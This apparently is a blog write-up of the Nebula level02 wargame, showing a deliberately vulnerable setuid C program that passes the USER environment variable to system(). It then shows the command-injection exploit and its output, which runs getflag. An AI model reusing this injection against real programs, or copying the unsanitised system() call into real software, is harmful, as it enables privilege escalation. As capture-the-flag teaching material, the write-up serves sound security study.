+++
author = "pwntester"
categories = ["nebula02"]
date = 2013-11-20T11:18:00Z
description = ""
draft = false
slug = "nebula-level02-write-up"
tags = ["nebula02"]
title = "Nebula level02 write-up"

+++

[Level02](http://exploit-exercises.com/nebula/level02) is about command injection. We are given the following vulnerable code:

```lang-clike line-numbers 
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/types.h>
#include <stdio.h>

int main(int argc, char **argv, char **envp)
{
  char *buffer;

  gid_t gid;
  uid_t uid;

  gid = getegid();
  uid = geteuid();

  setresgid(gid, gid, gid);
  setresuid(uid, uid, uid);

  buffer = NULL;

  asprintf(&buffer, "/bin/echo %s is cool", getenv("USER"));
  printf("about to call system(\"%s\")\n", buffer);

  system(buffer);
}
```

As shown in the code, the program will use the **USER** environment variable to build the command executed by **system** so all we need to do is inject our **getflag** command:

```lang-bash line-numbers 
level02@nebula:/home/flag02$ export USER=";getflag;echo "
level02@nebula:/home/flag02$ ./flag02
about to call system("/bin/echo ;getflag;echo  is cool")

You have successfully executed getflag on a target account
is cool
```
